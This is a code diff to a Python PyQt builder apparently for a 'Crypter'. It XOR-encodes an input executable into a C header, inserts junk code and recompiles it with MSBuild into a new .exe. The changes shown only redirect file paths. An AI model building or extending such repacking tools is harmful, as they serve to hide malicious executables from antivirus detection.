@@ -142,7 +142,7 @@ class Ui_mainWindow(object):
     
     def generate(self) :
         in_filename = self.filepath
-        out_filename = self.pushButton.text().split(".")[0] + "_out.exe"
+        out_filename = "../bin/" + self.pushButton.text().split(".")[0] + "_out.exe"
         xor_key = ''
 
         if self.xor :
@@ -160,7 +160,7 @@ class Ui_mainWindow(object):
         
         print(f"Filename : {in_filename}")
         file = bytearray(open(in_filename, 'rb').read())
-        with open("sample.h", 'w') as output:
+        with open("../Crypter/sample.h", 'w') as output:
             output.write("unsigned char sample[] = { ")
             for count, byte in enumerate(file, 1):
                 if xor_key :
@@ -176,10 +176,10 @@ class Ui_mainWindow(object):
         QCoreApplication.processEvents()
         
         # Working with a copy of main.cpp
-        os.rename("main.cpp", "DO_NOT_TOUCH.cpp")
-        shutil.copyfile('DO_NOT_TOUCH.cpp', 'main.cpp')
+        os.rename("../Crypter/main.cpp", "../Crypter/DO_NOT_TOUCH.cpp")
+        shutil.copyfile('../Crypter/DO_NOT_TOUCH.cpp', '../Crypter/main.cpp')
         
-        with open("config.h", "w") as c :
+        with open("../Crypter/config.h", "w") as c :
             c.write(f'#pragma once\n#define KEY "{xor_key}"')
         
         self.label_2.setText("Adding junk code...")
@@ -201,15 +201,15 @@ class Ui_mainWindow(object):
         vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
         cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
         
-        return_code = os.system("\""+cmd_line+"\" . /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
+        return_code = os.system("\""+cmd_line+"\" ../Crypter /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
         
         if return_code :
             self.label_2.setText("build failed.")
             QCoreApplication.processEvents()
 
         # Cleaning up..
-        os.remove("main.cpp")
-        os.rename("DO_NOT_TOUCH.cpp", "main.cpp")
+        os.remove("../Crypter/main.cpp")
+        os.rename("../Crypter/DO_NOT_TOUCH.cpp", "../Crypter/main.cpp")
         
         # Find all BMP files in the directory with a wildcard pattern
         bmp_files = glob.glob(os.path.join(".", "*.bmp"))
